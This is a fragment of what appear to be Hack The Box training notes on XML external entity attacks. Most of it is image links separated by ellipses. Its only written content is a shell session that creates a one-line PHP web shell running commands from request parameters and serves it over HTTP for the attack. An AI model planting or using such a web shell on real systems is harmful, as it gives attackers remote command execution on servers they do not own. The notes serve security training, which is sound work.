...
![](imgs/web_attacks_xxe_identify.jpg)
...
![xxe_request](imgs/web_attacks_xxe_request.jpg)
...
![xxe_response](imgs/web_attacks_xxe_response.jpg)
...
![new_entity](imgs/web_attacks_xxe_new_entity.jpg)
...
![external_entity](imgs/web_attacks_xxe_external_entity.jpg)
...
![file_php](imgs/web_attacks_xxe_file_php.jpg)
...
![file_php](imgs/web_attacks_xxe_php_filter.jpg)
...
```shell-session
swmpdnky@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
swmpdnky@htb[/htb]$ sudo python3 -m http.server 80
```
